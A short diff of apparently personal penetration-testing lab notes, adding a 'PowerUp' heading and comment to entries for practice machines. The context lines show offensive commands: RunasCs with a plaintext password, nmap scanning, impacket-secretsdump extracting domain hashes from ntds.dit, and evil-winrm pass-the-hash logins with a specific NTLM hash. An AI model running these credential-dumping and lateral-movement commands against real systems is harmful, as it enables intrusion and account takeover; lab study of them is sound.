@@ -986,7 +986,7 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "cmd.exe" -Remote
 # https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
 ```
 
-### Resourced - SMB - ntds.dit + SYSTEM File - 
+### Resourced - SMB - ntds.dit + SYSTEM File - PowerUp - 
 ```shell
 sudo nmap -sC -sV -Pn -p- 192.168.124.175 -oN 124.175_allport
 PORT      STATE SERVICE       VERSION
@@ -1051,6 +1051,8 @@ impacket-secretsdump - ntds ntds.dit - system SYSTEM LOCAL
 
 crackmapexec winrm 192.168.124.175 -u users -H hashesh
 evil-winrm -i 192.168.124.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
+
+# PowerUp
 ```
 
 ### Nagoya
